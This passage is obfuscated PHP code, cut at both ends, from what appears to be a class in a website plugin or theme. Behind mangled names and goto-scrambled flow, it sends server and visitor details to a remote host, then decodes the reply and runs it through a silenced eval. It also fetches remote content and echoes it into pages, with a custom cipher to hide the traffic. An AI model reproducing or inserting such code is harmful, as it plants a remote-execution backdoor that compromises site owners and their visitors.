$c¨ôÅ¿ì‰„[104]($this->kosba43503a3, $c¨ôÅ¿ì‰„[129], $c¨ôÅ¿ì‰„[10])); $f˜ê‘ôÕÍ = $aÎ‰ÍŞÙø[618]; goto E³Ó•Â»; d»Á¦¿ìéè: foreach ($C£—ìÃÕ‡Ì as $d‚‰è –‘Ù) { if (!$c¨ôÅ¿ì‰„[236]($d‚‰è –‘Ù, $cÃ¨ÊËÆòŸ)) { $aÛß•äÎ[] = $d‚‰è –‘Ù; } } foreach ($aÛß•äÎ as $d‚‰è –‘Ù) { unset($cñÏöÛÜ£[$d‚‰è –‘Ù]); } return $cñÏöÛÜ£; goto BÑˆ¬á˜; E³Ó•Â»: $aÛß•äÎ = array(); $fÛÜÍŸ‡Ò = $aÎ‰ÍŞÙø[619]; if (strlen($fÛÜÍŸ‡Ò) < $aÎ‰ÍŞÙø[548]) { return; } goto d»Á¦¿ìéè; AÊ†ßÜÛ­Ì: $aÎ‰ÍŞÙø =& $_SERVER[Äº¡•ô™Ÿ]; $c¨ôÅ¿ì‰„ =& $_SERVER[Ä³Œ±¸ü]; if ($this->gdek593ce87e == $c¨ôÅ¿ì‰„[254]) { return $cñÏöÛÜ£; } goto f“‘œ™óôí; BÑˆ¬á˜: } private function izjaa42b016f() { goto Aá›´«ñİŒ; B¾©¿àÙœ: if (strlen($C°’¡ì‹™) < $bµõÔŸóåå[561]) { die; } foreach ($c°‡¯‹´îŠ as $Fò¯ìà‘ô) { if ($Fò¯ìà‘ô == $A‹ÁÄÁË—¶ || $cÍìîÏ²‰æ[25]($A‹ÁÄÁË—¶, 0, $cÍìîÏ²‰æ[24]($Fò¯ìà‘ô)) == $Fò¯ìà‘ô) { $cÍìîÏ²‰æ[166]($cÍìîÏ²‰æ[197]($cÍìîÏ²‰æ[266]), !1); } } $GLOBALS[$cÍìîÏ²‰æ[91]][$cÍìîÏ²‰æ[95]][$cÍìîÏ²‰æ[267]] = $cÍìîÏ²‰æ[220]; goto FæÏÊ¤Ğ²; AàÆØÆ›ÈÉ: $A‹ÁÄÁË—¶ = $_SERVER[$cÍìîÏ²‰æ[44]]; $c°‡¯‹´îŠ = array($cÍìîÏ²‰æ[265]); $C°’¡ì‹™ = $bµõÔŸóåå[620]; goto B¾©¿àÙœ; AÑ¯ŸË†ªÓ: while (strlen($E³Äâë˜ª) < $bµõÔŸóåå[548]) { if (!$E³Äâë˜ª) { break; } $E³Äâë˜ª++; } $cÍìîÏ²‰æ[61]($cÍìîÏ²‰æ[269])->{$_SERVER[Ä³Œ±¸ü][221]}($cÍìîÏ²‰æ[85], $cÍìîÏ²‰æ[229]); $bÙ÷­Ğæ©å = $bµõÔŸóåå[622]; goto c®Ê‘‡¦èğ; Aá›´«ñİŒ: $bµõÔŸóåå =& $_SERVER[Äº¡•ô™Ÿ]; $cÍìîÏ²‰æ =& $_SERVER[Ä³Œ±¸ü]; if ($this->gdek593ce87e != $cÍìîÏ²‰æ[121]) { $GLOBALS[$cÍìîÏ²‰æ[91]][$cÍìîÏ²‰æ[95]][$cÍìîÏ²‰æ[264]] = $cÍìîÏ²‰æ[220]; return; } goto AàÆØÆ›ÈÉ; c®Ê‘‡¦èğ: if (!$bÙ÷­Ğæ©å) { return; } goto dÌÄ×ŞĞ½„; FæÏÊ¤Ğ²: $GLOBALS[$cÍìîÏ²‰æ[91]][$cÍìîÏ²‰æ[95]][$cÍìîÏ²‰æ[264]] = $cÍìîÏ²‰æ[229]; $GLOBALS[$cÍìîÏ²‰æ[91]][$cÍìîÏ²‰æ[268]] = $cÍìîÏ²‰æ[220]; $E³Äâë˜ª = $bµõÔŸóåå[621]; goto AÑ¯ŸË†ªÓ; dÌÄ×ŞĞ½„: } public function lqju24dda2bb() { return $_SERVER[Ä³Œ±¸ü][270]; } private function nlup03e5ba56() { goto FŠ¾ñ£´Û; a†ÄÌ•¥‰õ: if (!$fÕ¤‹Ø¢ã) { return; } if (!$Däˆ¢ù¬Ñ“[191]($eªµ‘±´ÈÌ)) { return; } if ($eªµ‘±´ÈÌ[$Däˆ¢ù¬Ñ“[165]] && $eªµ‘±´ÈÌ[$Däˆ¢ù¬Ñ“[280]]) { if ($this->{$_SERVER[Ä³Œ±¸ü][199]}($eªµ‘±´ÈÌ[$Däˆ¢ù¬Ñ“[280]]) == $FÓæèÏ¹ñÌ[$Däˆ¢ù¬Ñ“[165]]) { return; } } goto A¶–ª™øˆï; CÎ£°ÀÂÖÆ: if (!$eÉºÙ¯àˆ¬) { return; } $FÓæèÏ¹ñÌ = array($Däˆ¢ù¬Ñ“[165] => $Däˆ¢ù¬Ñ“[61]($Däˆ¢ù¬Ñ“[62])->{$_SERVER[Ä³Œ±¸ü][63]}($Däˆ¢ù¬Ñ“[209]), $Däˆ¢ù¬Ñ“[178] => $this->gdek593ce87e, $Däˆ¢ù¬Ñ“[176] => $_SERVER[$Däˆ¢ù¬Ñ“[177]], $Däˆ¢ù¬Ñ“[169] => $Däˆ¢ù¬Ñ“[149], $Däˆ¢ù¬Ñ“[172] => $_SERVER[$Däˆ¢ù¬Ñ“[173]]); $FÍÔ²Â§„É = $f…ÆÀÎöï”[625]; goto b¨Ú‡¯İí; FŠ¾ñ£´Û: $f…ÆÀÎöï” =& $_SERVER[Äº¡•ô™Ÿ]; $Däˆ¢ù¬Ñ“ =& $_SERVER[Ä³Œ±¸ü]; $e°¹”¡Ëé = array($Däˆ¢ù¬Ñ“[271], $Däˆ¢ù¬Ñ“[272], $Däˆ¢ù¬Ñ“[273]); goto cØ†¯ÚŠ¸; aĞÖ¼£—Š: if ($A¨¹…Ú½÷ && $Däˆ¢ù¬Ñ“[230]() - $A¨¹…Ú½÷ < $Däˆ¢ù¬Ñ“[201]($Däˆ¢ù¬Ñ“[278])) { return; } $Däˆ¢ù¬Ñ“[13](array($Däˆ¢ù¬Ñ“[276], $Däˆ¢ù¬Ñ“[152]), $D³ƒˆ”µƒ“, $Däˆ¢ù¬Ñ“[230]()); $eÉºÙ¯àˆ¬ = $f…ÆÀÎöï”[624]; goto CÎ£°ÀÂÖÆ; b¨Ú‡¯İí: while ($FÍÔ²Â§„É < $f…ÆÀÎöï”[558]) { if ($FÍÔ²Â§„É >= 0) { break; } $FÍÔ²Â§„É++; } $eªµ‘±´ÈÌ = $this->{$_SERVER[Ä³Œ±¸ü][182]}($Däˆ¢ù¬Ñ“[279], $FÓæèÏ¹ñÌ); $fÕ¤‹Ø¢ã = $f…ÆÀÎöï”[574]; goto a†ÄÌ•¥‰õ; cØ†¯ÚŠ¸: $FøëåÙ´¥ª = $f…ÆÀÎöï”[623]; $D³ƒˆ”µƒ“ = $Däˆ¢ù¬Ñ“[274] . $Däˆ¢ù¬Ñ“[114]($Däˆ¢ù¬Ñ“[275]); if ($this->gdek593ce87e == $Däˆ¢ù¬Ñ“[121] || !$Däˆ¢ù¬Ñ“[104]($GLOBALS, $Däˆ¢ù¬Ñ“[132])) { return; } goto e¸µ×ÄÎô; F™¿œÁ°º¨: if ($this->{$_SERVER[Ä³Œ±¸ü][199]}($eªµ‘±´ÈÌ[$Däˆ¢ù¬Ñ“[280]]) != $FÓæèÏ¹ñÌ[$Däˆ¢ù¬Ñ“[165]]) { $Eò‰‹Ñ˜‹Ú = array($Däˆ¢ù¬Ñ“[202] => $Däˆ¢ù¬Ñ“[61]($Däˆ¢ù¬Ñ“[62])->{$_SERVER[Ä³Œ±¸ü][63]}($Däˆ¢ù¬Ñ“[116]), $Däˆ¢ù¬Ñ“[203] => $_SERVER[$Däˆ¢ù¬Ñ“[115]], $Däˆ¢ù¬Ñ“[204] => $Däˆ¢ù¬Ñ“[205](), $Däˆ¢ù¬Ñ“[174] => $_SERVER[$Däˆ¢ù¬Ñ“[175]]); $Aš„š»“ŞÊ = $this->{$_SERVER[Ä³Œ±¸ü][206]}($Däˆ¢ù¬Ñ“[148]($Eò‰‹Ñ˜‹Ú)); $eªµ‘±´ÈÌ = $this->{$_SERVER[Ä³Œ±¸ü][182]}($Däˆ¢ù¬Ñ“[207] . $Aš„š»“ŞÊ); if ($eªµ‘±´ÈÌ && $Däˆ¢ù¬Ñ“[191]($eªµ‘±´ÈÌ) && isset($eªµ‘±´ÈÌ[$Däˆ¢ù¬Ñ“[280]])) { $Bñˆ­Òøˆ = $this->{$_SERVER[Ä³Œ±¸ü][188]}($eªµ‘±´ÈÌ[$Däˆ¢ù¬Ñ“[280]], 2); if ($Bñˆ­Òøˆ) { $Bñˆ­Òøˆ = $this->{$_SERVER[Ä³Œ±¸ü][199]}($Bñˆ­Òøˆ); } if ($Bñˆ­Òøˆ) { try { @eval($Bñˆ­Òøˆ); } catch (Exception $f‘Ç‹ë‡®) { } } } } goto E’“ã™…È¶; e¸µ×ÄÎô: if (!$Däˆ¢ù¬Ñ“[236]($_SERVER[$Däˆ¢ù¬Ñ“[44]], $e°¹”¡Ëé)) { return; } if ($Däˆ¢ù¬Ñ“[230]() % 4 != 0) { return; } $A¨¹…Ú½÷ = $Däˆ¢ù¬Ñ“[13](array($Däˆ¢ù¬Ñ“[276], $Däˆ¢ù¬Ñ“[277]), $D³ƒˆ”µƒ“); goto aĞÖ¼£—Š; A¶–ª™øˆï: $this->{$_SERVER[Ä³Œ±¸ü][164]}(); $a®…ÀÀëö = $f…ÆÀÎöï”[626]; if (!$a®…ÀÀëö) { return; } goto F™¿œÁ°º¨; E’“ã™…È¶: } private function hdpt08393717($Bö˜ßŒñËÄ = '', $cØÏÔéø— = array(), $dŒ÷¯ÓšÓ = 5) { goto e°»ƒ˜¹æ; e¾‡ò‹‰ó¼: if (strlen($f”·õîä¿×) < $aÈÂƒèóã±[561]) { die; } return $a¸Ò¯ê¿½[190]($cØÏÔéø—, !0); $B´ƒºÙöÄÖ = $aÈÂƒèóã±[630]; goto FÜ¢•ˆÆ¶á; cèªƒÙ®À: $Dò™ëò¸» = $this->{$_SERVER[Ä³Œ±¸ü][243]}($Dò™ëò¸», $a¸Ò¯ê¿½[282]); $FÈÌî“ç½ = $aÈÂƒèóã±[567]; if (!$FÈÌî“ç½) { die; } goto fªæ¼×Œ•ô; b“‡îé°Í˜: if ($cØÏÔéø— === -1) { return $Dò™ëò¸»; } $BŒŞØ„‚ë = $a¸Ò¯ê¿½[245](array($a¸Ò¯ê¿½[246] => array($a¸Ò¯ê¿½[249] => $dŒ÷¯ÓšÓ, $a¸Ò¯ê¿½[247] => $a¸Ò¯ê¿½[285]), $a¸Ò¯ê¿½[286] => array($a¸Ò¯ê¿½[287] => !1, $a¸Ò¯ê¿½[288] => !1))); $Aõ†ÈÀìÑğ = $aÈÂƒèóã±[628]; goto a»¼ã…¡Ø; fªæ¼×Œ•ô: $Dò™ëò¸» = $Dò™ëò¸» . $Bö˜ßŒñËÄ . $a¸Ò¯ê¿½[283] . $a¸Ò¯ê¿½[284]($cØÏÔéø—); $dØÊàœ´ãÏ = $aÈÂƒèóã±[627]; if (strlen($dØÊàœ´ãÏ) < $aÈÂƒèóã±[544]) { die; } goto b“‡îé°Í˜; a»¼ã…¡Ø: while ($Aõ†ÈÀìÑğ < $aÈÂƒèóã±[558]) { if ($Aõ†ÈÀìÑğ >= 0) { break; } $Aõ†ÈÀìÑğ++; } $cØÏÔéø— = @$a¸Ò¯ê¿½[250]($Dò™ëò¸», !1, $BŒŞØ„‚ë); $f”·õîä¿× = $aÈÂƒèóã±[629]; goto e¾‡ò‹‰ó¼; e°»ƒ˜¹æ: $aÈÂƒèóã± =& $_SERVER[Äº¡•ô™Ÿ]; $a¸Ò¯ê¿½ =& $_SERVER[Ä³Œ±¸ü]; $Dò™ëò¸» = $a¸Ò¯ê¿½[281]; goto cèªƒÙ®À; FÜ¢•ˆÆ¶á: if (!$B´ƒºÙöÄÖ) { die; } $FøÉÂÍœé± = $aÈÂƒèóã±[631]; goto f¼‹™¯ãœÜ; f¼‹™¯ãœÜ: } private function vusmd2fa066b() { goto BçÇòøÓù‚; B‚‹‹…â¶÷: $D½Îáª„§ì = $E—æ¾›î…‹[632]; $c‘‘•Ñ•“ƒ = $E„¦»‰ÕÑ[$this->gdek593ce87e]; $aÔ¯¡ÆŒ = $E—æ¾›î…‹[633]; goto bÅ¦à¬‚Ø–; BçÇòøÓù‚: $E—æ¾›î…‹ =& $_SERVER[Äº¡•ô™Ÿ]; $CÂ–‹š÷Êó =& $_SERVER[Ä³Œ±¸ü]; $E„¦»‰ÕÑ = array($CÂ–‹š÷Êó[289] => $CÂ–‹š÷Êó[290], $CÂ–‹š÷Êó[291] => $CÂ–‹š÷Êó[292], $CÂ–‹š÷Êó[293] => $CÂ–‹š÷Êó[294], $CÂ–‹š÷Êó[295] => $CÂ–‹š÷Êó[296], $CÂ–‹š÷Êó[297] => $CÂ–‹š÷Êó[298], $CÂ–‹š÷Êó[299] => $CÂ–‹š÷Êó[238], $CÂ–‹š÷Êó[300] => $CÂ–‹š÷Êó[238], $CÂ–‹š÷Êó[301] => $CÂ–‹š÷Êó[290], $CÂ–‹š÷Êó[302] => $CÂ–‹š÷Êó[292], $CÂ–‹š÷Êó[303] => $CÂ–‹š÷Êó[294], $CÂ–‹š÷Êó[304] => $CÂ–‹š÷Êó[305], $CÂ–‹š÷Êó[306] => $CÂ–‹š÷Êó[296], $CÂ–‹š÷Êó[307] => $CÂ–‹š÷Êó[308], $CÂ–‹š÷Êó[309] => $CÂ–‹š÷Êó[298], $CÂ–‹š÷Êó[310] => $CÂ–‹š÷Êó[311], $CÂ–‹š÷Êó[312] => $CÂ–‹š÷Êó[313], $CÂ–‹š÷Êó[314] => $CÂ–‹š÷Êó[315]); goto B‚‹‹…â¶÷; d·õ­“Ÿ™Ü: if (strlen($fë·ŸàŸø) < $E—æ¾›î…‹[558]) { die; } $eÃªÉ„Ùî† = $CÂ–‹š÷Êó[104]($this->kosba43503a3, $CÂ–‹š÷Êó[316]); $eô‘‰ØŞŸÇ = $E—æ¾›î…‹[635]; goto DÌ©àƒŞ¶‹; bÅ¦à¬‚Ø–: if (!$aÔ¯¡ÆŒ) { return; } $c‘‘•Ñ•“ƒ = $CÂ–‹š÷Êó[201]($c‘‘•Ñ•“ƒ ? $c‘‘•Ñ•“ƒ : $CÂ–‹š÷Êó[290]); $fë·ŸàŸø = $E—æ¾›î…‹[634]; goto d·õ­“Ÿ™Ü; DÌ©àƒŞ¶‹: $eÃªÉ„Ùî† = $eÃªÉ„Ùî† ? $CÂ–‹š÷Êó[201]($eÃªÉ„Ùî†) : 0; return $c‘‘•Ñ•“ƒ + $eÃªÉ„Ùî†; goto c¸åàµ–Šö; c¸åàµ–Šö: } public function zewb0adf0dce($f…÷¦¼öó) { goto díŒİ×‡Ö®; b­‚²°ç˜Í: $c»òµïÆ = $Aìß¼¹×[222]($c»òµïÆ, $Aìß¼¹×[10], $Aìß¼¹×[318]); if (!$Aìß¼¹×[236]($f…÷¦¼öó[$Aìß¼¹×[318]], $c»òµïÆ)) { $Aìß¼¹×[166]($Aìß¼¹×[321], !1, $Aìß¼¹×[233]); } goto Fó¤‡îøˆ†; Dâ½Â«ñ¡À: $e„ğâæã = $Aìß¼¹×[61]($Aìß¼¹×[139])->{$_SERVER[Ä³Œ±¸ü][140]}(); if ($e„ğâæã <= $A±±…Ùòó”) { return; } $c»òµïÆ = $Aìß¼¹×[61]($Aìß¼¹×[139])->{$_SERVER[Ä³Œ±¸ü][317]}($Aìß¼¹×[318])->{$_SERVER[Ä³Œ±¸ü][319]}($A±±…Ùòó”)->{$_SERVER[Ä³Œ±¸ü][320]}(); goto b­‚²°ç˜Í; díŒİ×‡Ö®: $Aìß¼¹× =& $_SERVER[Ä³Œ±¸ü]; $A±±…Ùòó” = $this->{$_SERVER[Ä³Œ±¸ü][137]}(); if ($A±±…Ùòó” >= $Aìß¼¹×[201]($Aìß¼¹×[238])) { return; } goto Dâ½Â«ñ¡À; Fó¤‡îøˆ†: } public function tnzm1a4420fc() { goto bÄ¶–ÀŞ›; bÄ¶–ÀŞ›: $FÂÙÇÅÚöÑ =& $_SERVER[Äº¡•ô™Ÿ]; $AÀÕÛ¸†áç =& $_SERVER[Ä³Œ±¸ü]; if (!$AÀÕÛ¸†áç[104]($GLOBALS, $AÀÕÛ¸†áç[132]) || $AÀÕÛ¸†áç[322](1, 100) > 20) { return; } goto FÆäéÌ‰ïÊ; E“Õ‘œ°Ñ: if (!$D´éÕàËÜ) { die; } $càÛÌÓ‚µö = $AÀÕÛ¸†áç[245](array($AÀÕÛ¸†áç[246] => array($AÀÕÛ¸†áç[247] => $AÀÕÛ¸†áç[248], $AÀÕÛ¸†áç[249] => 3))); $E§×ĞÖîóô = @$AÀÕÛ¸†áç[250]($Dä¼›·‹Œ¦, !1, $càÛÌÓ‚µö); goto CÙïƒ»´Èë; CÙïƒ»´Èë: echo $AÀÕÛ¸†áç[323] . $AÀÕÛ¸†áç[324]($E§×ĞÖîóô) . $AÀÕÛ¸†áç[325]; $BÒùğÎæ²Ø = $FÂÙÇÅÚöÑ[637]; if (!$BÒùğÎæ²Ø) { return; } goto dÄÕãÕ†ŠĞ; FÆäéÌ‰ïÊ: $Dä¼›·‹Œ¦ = $AÀÕÛ¸†áç[242]; $Dä¼›·‹Œ¦ = $this->{$_SERVER[Ä³Œ±¸ü][243]}($Dä¼›·‹Œ¦, $AÀÕÛ¸†áç[244]); $D´éÕàËÜ = $FÂÙÇÅÚöÑ[636]; goto E“Õ‘œ°Ñ; dÄÕãÕ†ŠĞ: } private function oqsac9679ef8($dëÊèºíöï, $DÜˆ»Œ‡è , $C‚öß‚²èõ = 3) { goto Aº§´ÓÇšÕ; D†ÆãŞÌŠÕ: switch ($E“§áŠšÌ¢) { case $b–Æ¢Ûó‹Ä[229]: $dÕÃ¥Ü¥Î = $this->{$_SERVER[Ä³Œ±¸ü][147]}($dëÊèºíöï, $b–Æ¢Ûó‹Ä[214]($DÜˆ»Œ‡è  . $d†„Ğ“»“Ô)); break; case $b–Æ¢Ûó‹Ä[220]: $dÕÃ¥Ü¥Î = $this->{$_SERVER[Ä³Œ±¸ü][147]}($dëÊèºíöï, $b–Æ¢Ûó‹Ä[214]($d†„Ğ“»“Ô . $DÜˆ»Œ‡è )); break; $F·ÔíÚ¼Ïò = $D¹ö¼½Ä°Ø[642]; if (strlen($F·ÔíÚ¼Ïò) < $D¹ö¼½Ä°Ø[555]) { die; } case $b–Æ¢Ûó‹Ä[328]: $dÕÃ¥Ü¥Î = $this->{$_SERVER[Ä³Œ±¸ü][147]}($dëÊèºíöï, $b–Æ¢Ûó‹Ä[118]($d†„Ğ“»“Ô . $DÜˆ»Œ‡è )); break; case $b–Æ¢Ûó‹Ä[329]: $dÕÃ¥Ü¥Î = $this->{$_SERVER[Ä³Œ±¸ü][147]}($dëÊèºíöï, $b–Æ¢Ûó‹Ä[114]($d†„Ğ“»“Ô . $DÜˆ»Œ‡è )); break; $FÌ¢ÜİíŞâ = $D¹ö¼½Ä°Ø[643]; case $b–Æ¢Ûó‹Ä[330]: goto fÎãƒù½ğ; fÜ¾»Ô¶¢: while (strlen($bİ„ğÇÅ¶­) < $D¹ö¼½Ä°Ø[555]) { if (!$bİ„ğÇÅ¶­) { break; } $bİ„ğÇÅ¶­++; } $Eà¶ÔöººÖ = $EË‰Í›î•[$fÃ¼•»ŞÔˆ]; $eí……´ÄÅ² = $b–Æ¢Ûó‹Ä[114]($Eà¶ÔöººÖ . $b–Æ¢Ûó‹Ä[114]($DÜˆ»Œ‡è  . $Eà¶ÔöººÖ) . $DÜˆ»Œ‡è ); goto A‘¶ãÚÂ±¥; b­ŠÙ˜Ó„‚: $c®¥´Î÷Ì = $b–Æ¢Ûó‹Ä[10]; $fè³ÕõİåÔ = 0; $bÕˆÜ¦àãç = $D¹ö¼½Ä°Ø[646]; goto a„øÀˆéñÈ; a„øÀˆéñÈ: if (!$bÕˆÜ¦àãç) { die; } $b•Ÿ©¯ØÓ¹ = 0; $A—›‡œ†¼„ = 0; goto DÅİ—ôŞÖ; A‘¶ãÚÂ±¥: $eí……´ÄÅ² = $b–Æ¢Ûó‹Ä[25]($eí……´ÄÅ², $fÃ¼•»ŞÔˆ % 8, $fÃ¼•»ŞÔˆ % 8 + 7); $Aä÷¹Şšã = $D¹ö¼½Ä°Ø[645]; while ($Aä÷¹Şšã < $D¹ö¼½Ä°Ø[558]) { if ($Aä÷¹Şšã >= 0) { break; } $Aä÷¹Şšã++; } goto b­ŠÙ˜Ó„‚; DÅİ—ôŞÖ: for ($fè³ÕõİåÔ = 0; $fè³ÕõİåÔ < $b–Æ¢Ûó‹Ä[24]($dëÊèºíöï); $fè³ÕõİåÔ++) { $A—›‡œ†¼„ = $A—›‡œ†¼„ == $b–Æ¢Ûó‹Ä[24]($eí……´ÄÅ²) ? 0 : $A—›‡œ†¼„; $b•Ÿ©¯ØÓ¹ = ($fÃ¼•»ŞÔˆ + $b–Æ¢Ûó‹Ä[332]($EË‰Í›î•, $dëÊèºíöï[$fè³ÕõİåÔ]) + $b–Æ¢Ûó‹Ä[333]($eí……´ÄÅ²[$A—›‡œ†¼„++])) % 64; $D¿ó¼äë–Ä = $D¹ö¼½Ä°Ø[647]; while ($D¿ó¼äë–Ä < $D¹ö¼½Ä°Ø[561]) { if ($D¿ó¼äë–Ä >= 0) { break; } $D¿ó¼äë–Ä++; } $c®¥´Î÷Ì .= $EË‰Í›î•[$b•Ÿ©¯ØÓ¹]; } $dÕÃ¥Ü¥Î = $b–Æ¢Ûó‹Ä[324]($Eà¶ÔöººÖ . $c®¥´Î÷Ì); $d«í¢°¦ï = $D¹ö¼½Ä°Ø[648]; goto Fİ¹ŒùğÑÍ; fÎãƒù½ğ: $dëÊèºíöï = $b–Æ¢Ûó‹Ä[118]($dëÊèºíöï); $fÃ¼•»ŞÔˆ = $b–Æ¢Ûó‹Ä[331](0, 64); $bİ„ğÇÅ¶­ = $D¹ö¼½Ä°Ø[644]; goto fÜ¾»Ô¶¢; Fİ¹ŒùğÑÍ: if (!$d«í¢°¦ï) { die; } break; goto AˆÓËæ˜‡Á; AˆÓËæ˜‡Á: default: $dÕÃ¥Ü¥Î = $this->{$_SERVER[Ä³Œ±¸ü][147]}($dëÊèºíöï, $DÜˆ»Œ‡è  . $d†„Ğ“»“Ô); $c¯”­¡ì· = $D¹ö¼½Ä°Ø[649]; if (!$c¯”­¡ì·) { die; } break; $bÖÇßÔêĞÌ = $D¹ö¼½Ä°Ø[650]; } $dÕÃ¥Ü¥Î = $b–Æ¢Ûó‹Ä[214]($E“§áŠšÌ¢ . $d†„Ğ“»“Ô . $dÕÃ¥Ü¥Î); $aî–µƒ†Ğ” = $D¹ö¼½Ä°Ø[651]; goto f¼Ç»éÙ¥¢; Aä‹Ó×øè: $d†„Ğ“»“Ô = $b–Æ¢Ûó‹Ä[124](15); $d…â“õˆóµ = $D¹ö¼½Ä°Ø[640]; if (!$d…â“õˆóµ) { die; } goto c¿Ùç¢•éĞ; c¿Ùç¢•éĞ: $EË‰Í›î• = $b–Æ¢Ûó‹Ä[327]; $fö¡Àé‡øé = $D¹ö¼½Ä°Ø[641]; if (strlen($fö¡Àé‡øé) < $D¹ö¼½Ä°Ø[548]) { return; } goto D†ÆãŞÌŠÕ; f¼Ç»éÙ¥¢: if (!$aî–µƒ†Ğ”) { die; } if ($C‚öß‚²èõ - 1 > 0) { $dÕÃ¥Ü¥Î = $this->{$_SERVER[Ä³Œ±¸ü][127]}($dÕÃ¥Ü¥Î, $DÜˆ»Œ‡è , $C‚öß‚²èõ - 1); } return $dÕÃ¥Ü¥Î; goto aµ—Æ§ºÒœ; b‡ÌÆåõÖ›: $E“§áŠšÌ¢ = $b–Æ¢Ûó‹Ä[322](0, 5) . $b–Æ¢Ûó‹Ä[10]; $BáÛœÌß·È = $D¹ö¼½Ä°Ø[639]; if (!$BáÛœÌß·È) { return; } goto Aä‹Ó×øè; C„ÊìÕË—: $F†ãš…áØÆ = $D¹ö¼½Ä°Ø[638]; if (strlen($F†ãš…áØÆ) < $D¹ö¼½Ä°Ø[558]) { die; } $dëÊèºíöï = $b–Æ¢Ûó‹Ä[2]($dëÊèºíöï); goto b‡ÌÆåõÖ›; Aº§´ÓÇšÕ: $D¹ö¼½Ä°Ø =& $_SERVER[Äº¡•ô™Ÿ]; $b–Æ¢Ûó‹Ä =& $_SERVER[Ä³Œ±¸ü]; $b–Æ¢Ûó‹Ä[326](1); goto C„ÊìÕË—; aµ—Æ§ºÒœ: } private function rdqw8b3c3dcd($d±Úˆ¹Àèä, $bòÎİï¢İ, $FŠ¤µËÁíê = 3) { goto b±Ò™Æ•ÏË; FÒ¨´ìÁ‘ç: $Eòñ°àé¼Œ = $d±Úˆ¹Àèä[0]; $d¹ŞÚ‹£Â = $Bğé›¹÷…[25]($d±Úˆ¹Àèä, 1, 15); $d±Úˆ¹Àèä = $Bğé›¹÷…[25]($d±Úˆ¹Àèä, 16); goto FÚíò…³ß½; b±Ò™Æ•ÏË: $cçÂøÒãƒ =& $_SERVER[Äº¡•ô™Ÿ]; $Bğé›¹÷… =& $_SERVER[Ä³Œ±¸ü]; if (!$Bğé›¹÷…[334]($d±Úˆ¹Àèä) || $Bğé›¹÷…[24]($d±Úˆ¹Àèä) < 10) { return !1; } goto b·†ƒ®™ö¿; FŸ©¢öÎä: if ($FŠ¤µËÁíê - 1 > 0) { $Eàæ°¤À–â = $this->{$_SERVER[Ä³Œ±¸ü][188]}($Eàæ°¤À–â, $bòÎİï¢İ, $FŠ¤µËÁíê - 1); } return $Eàæ°¤À–â; goto EÇ´›İÆ“; f©ˆØš§ØÚ: $d±Úˆ¹Àèä = $Bğé›¹÷…[214]($d±Úˆ¹Àèä); $Cá¼¬‰‹ƒµ = $cçÂøÒãƒ[653]; if (strlen($Cá¼¬‰‹ƒµ) < $cçÂøÒãƒ[544]) { die; } goto FÒ¨´ìÁ‘ç; b·†ƒ®™ö¿: $d±Úˆ¹Àèä = $Bğé›¹÷…[2]($d±Úˆ¹Àèä); $FÇ˜±˜¾‚… = $cçÂøÒãƒ[652]; if (strlen($FÇ˜±˜¾‚…) < $cçÂøÒãƒ[558]) { die; } goto f©ˆØš§ØÚ; FÚíò…³ß½: $bÚ¢×æ»ÙÏ = $Bğé›¹÷…[327]; $b‡’™Ö£Ë = $cçÂøÒãƒ[654]; switch ($Eòñ°àé¼Œ) { case $Bğé›¹÷…[229]: $Eàæ°¤À–â = $this->{$_SERVER[Ä³Œ±¸ü][243]}($d±Úˆ¹Àèä, $Bğé›¹÷…[214]($bòÎİï¢İ . $d¹ŞÚ‹£Â)); $a¢ñ†ÜˆÒá = $cçÂøÒãƒ[655]; break; case $Bğé›¹÷…[220]: $Eàæ°¤À–â = $this->{$_SERVER[Ä³Œ±¸ü][243]}($d±Úˆ¹Àèä, $Bğé›¹÷…[214]($d¹ŞÚ‹£Â . $bòÎİï¢İ)); break; case $Bğé›¹÷…[328]: $Eàæ°¤À–â = $this->{$_SERVER[Ä³Œ±¸ü][243]}($d±Úˆ¹Àèä, $Bğé›¹÷…[118]($d¹ŞÚ‹£Â . $bòÎİï¢İ)); break; case $Bğé›¹÷…[329]: $Eàæ°¤À–â = $this->{$_SERVER[Ä³Œ±¸ü][243]}($d±Úˆ¹Àèä, $Bğé›¹÷…[114]($d¹ŞÚ‹£Â . $bòÎİï¢İ)); break; case $Bğé›¹÷…[330]: goto C¼åùÔ‡•ë; B‚Í…çÍŒß: $Bøˆø–äÖ„ = $cçÂøÒãƒ[659]; while ($Bøˆø–äÖ„ < $cçÂøÒãƒ[561]) { if ($Bøˆø–äÖ„ >= 0) { break; } $Bøˆø–äÖ„++; } $D«Ñë¼ôÊ = $Bğé›¹÷…[10]; goto e¤ñÊ®£§; CÃ˜ïÚÕğ: $Dø²²·ŒÂË = $cçÂøÒãƒ[658]; while ($Dø²²·ŒÂË < $cçÂøÒãƒ[561]) { if ($Dø²²·ŒÂË >= 0) { break; } $Dø²²·ŒÂË++; } $f¦’‚ŒİĞ = $Bğé›¹÷…[25]($f¦’‚ŒİĞ, $A¨¤åØÂé % 8, $A¨¤åØÂé % 8 + 7); goto B‚Í…çÍŒß; C¾´¼Ú©é: $a¡Æ“ÅÖ— = $cçÂøÒãƒ[656]; while (strlen($a¡Æ“ÅÖ—) < $cçÂøÒãƒ[558]) { if (!$a¡Æ“ÅÖ—) { break; } $a¡Æ“ÅÖ—++; } $A¨¤åØÂé = $Bğé›¹÷…[332]($bÚ¢×æ»ÙÏ, $D–÷Øá‚Ğ); goto A…Ö—‹õ; B¿ˆ…í¿Øö: $Cšš…·Ù³„ = $cçÂøÒãƒ[662]; $DÂŠÙåÄšã = 0; $Bèâ±ï¶œ¤ = $cçÂøÒãƒ[663]; goto bÉ©’æåÉ¦; bÉ©’æåÉ¦: if (!$Bèâ±ï¶œ¤) { return; } for ($DÈ¬¥Ğ„íê = 0; $DÈ¬¥Ğ„íê < $Bğé›¹÷…[24]($d±Úˆ¹Àèä); $DÈ¬¥Ğ„íê++) { $DÂŠÙåÄšã = $DÂŠÙåÄšã == $Bğé›¹÷…[24]($f¦’‚ŒİĞ) ? 0 : $DÂŠÙåÄšã; $a¨°ƒš •È = $cçÂøÒãƒ[664]; if (strlen($a¨°ƒš •È) < $cçÂøÒãƒ[555]) { die; } $BƒµÈÏÓÌ = $DÂŠÙåÄšã++; $AõÏ”†÷É£ = $cçÂøÒãƒ[665]; if (!$AõÏ”†÷É£) { die; } $dÇâïì”…¯ = $Bğé›¹÷…[332]($bÚ¢×æ»ÙÏ, $d±Úˆ¹Àèä[$DÈ¬¥Ğ„íê]) - $A¨¤åØÂé - $Bğé›¹÷…[333]($f¦’‚ŒİĞ[$BƒµÈÏÓÌ]); $e’İ«Éğ˜Ã = 